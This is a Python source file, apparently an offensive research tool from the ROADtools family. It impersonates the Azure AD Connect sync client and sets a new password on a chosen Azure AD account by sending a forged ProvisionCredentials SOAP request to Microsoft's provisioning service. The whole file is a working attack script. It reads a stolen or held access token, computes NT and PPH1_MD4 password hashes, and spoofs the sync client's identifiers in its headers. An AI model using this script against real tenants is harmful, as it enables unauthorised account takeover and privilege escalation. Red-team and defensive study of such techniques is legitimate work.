from lib.wcf.records import Record, print_records
from lib.wcf.xml2records import XMLParser
from lib.wcf.records import dump_records
from io import BytesIO, StringIO
from roadtools.roadlib.auth import Authentication, get_data, WELLKNOWN_CLIENTS, WELLKNOWN_RESOURCES
from impacket.ldap.ldaptypes import LDAP_SID
from Cryptodome.Hash import HMAC, MD4, MD5, SHA256
from Cryptodome.Protocol.KDF import PBKDF2
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64
import sys
import os
import logging
import requests
import argparse
import codecs
import json
import binascii
import datetime
import xml.etree.ElementTree as ET


REQ_TEMPLATE = '''<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing">
 <s:Header>
  <a:Action s:mustUnderstand="1">http://schemas.microsoft.com/online/aws/change/2010/01/IProvisioningWebService/ProvisionCredentials</a:Action>
  <SyncToken s:role="urn:microsoft.online.administrativeservice" xmlns="urn:microsoft.online.administrativeservice" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
   <ApplicationId xmlns="http://schemas.microsoft.com/online/aws/change/2010/01">1651564e-7ce4-4d99-88be-0a65050d8dc3</ApplicationId>
   <BearerToken xmlns="http://schemas.microsoft.com/online/aws/change/2010/01">{token}</BearerToken>
   <ClientVersion xmlns="http://schemas.microsoft.com/online/aws/change/2010/01">8.0</ClientVersion>
   <DirSyncBuildNumber xmlns="http://schemas.microsoft.com/online/aws/change/2010/01">2.1.19.0</DirSyncBuildNumber>
   <FIMBuildNumber xmlns="http://schemas.microsoft.com/online/aws/change/2010/01">2.1.19.0</FIMBuildNumber>
   <IsInstalledOnDC xmlns="http://schemas.microsoft.com/online/aws/change/2010/01">False</IsInstalledOnDC>
   <IssueDateTime xmlns="http://schemas.microsoft.com/online/aws/change/2010/01">0001-01-01T00:00:00</IssueDateTime>
   <LanguageId xmlns="http://schemas.microsoft.com/online/aws/change/2010/01">en-US</LanguageId>
   <LiveToken xmlns="http://schemas.microsoft.com/online/aws/change/2010/01"></LiveToken>
   <ProtocolVersion xmlns="http://schemas.microsoft.com/online/aws/change/2010/01">2.0</ProtocolVersion>
   <RichCoexistenceEnabled xmlns="http://schemas.microsoft.com/online/aws/change/2010/01">False</RichCoexistenceEnabled>
   <TrackingId xmlns="http://schemas.microsoft.com/online/aws/change/2010/01">2f90f328-bce5-4110-9d82-7dede2e4fdd7</TrackingId>
  </SyncToken>
  <a:MessageID>urn:uuid:debeb5f6-c428-4520-8650-f0d63a2e998c</a:MessageID>
  <a:ReplyTo>
   <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
  </a:ReplyTo>
  <a:To s:mustUnderstand="1">https://adminwebservice.microsoftonline.com/provisioningservice.svc</a:To>
 </s:Header>
 <s:Body>
  <ProvisionCredentials xmlns="http://schemas.microsoft.com/online/aws/change/2010/01">
   <request xmlns:b="http://schemas.datacontract.org/2004/07/Microsoft.Online.Coexistence.Schema" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
    <b:RequestItems>
     <b:SyncCredentialsChangeItem>
      <b:ChangeDate>{changedate}</b:ChangeDate>
      {cloudanchor}
      <b:CredentialData>{pwdhash}</b:CredentialData>
      <b:ForcePasswordChangeOnLogon>false</b:ForcePasswordChangeOnLogon>
      {sourceanchor}
      <b:WindowsLegacyCredentials i:nil="true"></b:WindowsLegacyCredentials>
      <b:WindowsSupplementalCredentials i:nil="true" xmlns="mustUnderstand"></b:WindowsSupplementalCredentials>
     </b:SyncCredentialsChangeItem>
    </b:RequestItems>
   </request>
  </ProvisionCredentials>
 </s:Body>
</s:Envelope>'''


def main():
    parser = argparse.ArgumentParser()

    parser.add_argument('--access-token', action='store', help='Access token for Azure AD Graph. If not specified, taken from .roadtools_auth')
    parser.add_argument('-a', '--sourceanchor', action='store', help='Source anchor of object to modify')
    parser.add_argument('-c', '--cloudanchor', action='store', help='Cloud anchor of object to modify')
    parser.add_argument('-p', '--password', action='store', help='Password to set on the account')
    parser.add_argument('-t', '--tenant', action='store', help='Tenant ID or domain to auth to')
    parser.add_argument('-d', '--debug', action='store_true', help='Use debug output')

    args = parser.parse_args()
    auth = Authentication()
    logging.basicConfig()
    logger = logging.getLogger()
    if args.debug:
        logger.setLevel(logging.DEBUG)

    if args.access_token:
        tokenobject, tokendata = auth.parse_accesstoken(args.access_token)
    else:
        try:
            with codecs.open('.roadtools_auth', 'r', 'utf-8') as infile:
                tokenobject = json.load(infile)
            _, tokendata = auth.parse_accesstoken(tokenobject['accessToken'])
        except FileNotFoundError:
            logging.error('No auth data found. Ether supply an access token with --access-token or make sure a token is present on disk in .roadtools_auth')
            return

    if tokendata['aud'] != 'https://graph.windows.net' and tokendata['aud'] != 'https://graph.windows.net/':
        logging.error(f"Wrong token audience, got {tokendata['aud']} but expected: https://graph.windows.net")
        logging.error("Make sure to request a token with -r https://graph.windows.net")
        return

    if not args.sourceanchor and not args.cloudanchor:
        logging.error('No source anchor or cloud anchor was specified. Either of these parameter is required to indicate the user to modify')
        return

    # All ok, starting request parsing

    # Calculate password
    # Reference: https://www.dsinternals.com/en/how-azure-active-directory-connect-syncs-passwords/
    utf16pwd = args.password.encode('utf-16-le')
    nthash = MD4.new(utf16pwd).hexdigest()

    logging.debug('NT hash: %s', nthash)

    inputhash = nthash.upper().encode('utf-16-le')
    salt = os.urandom(16)
    kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=1000,
    )
    outputhash = binascii.hexlify(kdf.derive(inputhash)).decode('utf-8')
    logging.debug('PPH1_MD4 hash: %s', outputhash)
    salttext = binascii.hexlify(salt).decode('utf-8')
    pwdhash = f'v1;PPH1_MD4,{salttext},1000,{outputhash};'

    if not args.cloudanchor:
        cloudanchor = '<b:CloudAnchor i:nil="true"></b:CloudAnchor>'
    else:
        cloudanchor = f'<b:CloudAnchor>{args.cloudanchor}</b:CloudAnchor>'

    if not args.sourceanchor:
        sourceanchor = '<b:SourceAnchor i:nil="true"></b:SourceAnchor>'
    else:
        sourceanchor = f'<b:SourceAnchor>{args.sourceanchor}</b:SourceAnchor>'

    # Datetime
    changedate = datetime.datetime.now().isoformat()

    body = REQ_TEMPLATE.format(token=tokenobject['accessToken'], changedate=changedate, cloudanchor=cloudanchor, sourceanchor=sourceanchor, pwdhash=pwdhash)
    logging.debug(body)
    
    # Encode body in binary format
    parser = XMLParser.parse(body)
    data = dump_records(parser)

    # Headers
    hdata = '''Content-Type: application/soap+msbin1
Content-Type: application/soap+msbin1
x-ms-aadmsods-apiaction: ProvisionCredentials
x-ms-aadmsods-appid: 6eb59a73-39b2-4c23-a70f-e2e3ce8965b1
client-request-id: 239bcac6-182a-432c-930d-eb266f9ee41c
x-ms-aadmsods-clientversion: 8.0
x-ms-aadmsods-dirsyncbuildnumber: 2.1.19.0
x-ms-aadmsods-fimbuildnumber: 2.1.19.0
x-ms-aadmsods-tenantid: 6287f28f-4f7f-4322-9651-a8697d8fe1bc
x-ms-aadmsods-machineid: 90fa08e6-8a70-493d-a40e-df5af1c5d573
x-ms-aadmsods-provisioningsessiondesc: Connector-c7a8a4f7-0f68-4f7c-b688-88e6306d3894
x-ms-aadmsods-scenario: export-scheduled-regular
Expect: 100-continue'''
    headers = {}
    for hdrdata in hdata.split('\n'):
        header, value = hdrdata.split(': ')
        headers[header] = value

    # Send final payload
    logging.info('Sending update request')
    res = requests.post('https://adminwebservice.microsoftonline.com/provisioningservice.svc', data=data, headers=headers)
    logging.debug(res.status_code)
    print()
    records = Record.parse(BytesIO(res.content))

    # Parse into StringIO to use it as fd
    xmldata = StringIO()
    print_records(records, fp=xmldata)
    xmldata.seek(0)
    logging.debug(xmldata.read())
    xmldata.seek(0)
    tree = ET.parse(xmldata)
    # Find generic error first
    els = tree.findall('.//{*}ErrorDescription')
    if len(els) > 0:
        logging.error(els[0].text)
    else:
        els = tree.find('.//{http://schemas.datacontract.org/2004/07/Microsoft.Online.Coexistence.Schema}SyncCredentialsChangeResult')
        if els:
            result = els.find('{http://schemas.datacontract.org/2004/07/Microsoft.Online.Coexistence.Schema}Result')
            if result is not None:
                resultcode = int(result.text)
                if resultcode == 0:
                    logging.info('Modification OK')
                else:
                    logging.error('Received an error from the provisiong service. Resultcode = %d', resultcode)
                    exterror = els.find('./{http://schemas.datacontract.org/2004/07/Microsoft.Online.Coexistence.Schema}ExtendedErrorInformation')
                    if exterror is not None:
                        logging.error(exterror.text)
                    else:
                        logging.info('No extended error information supplied')
            else:
                logging.error('Could not find result in XML')
        else:
            logging.error('Could not find result in XML')

if __name__ == '__main__':
    main()
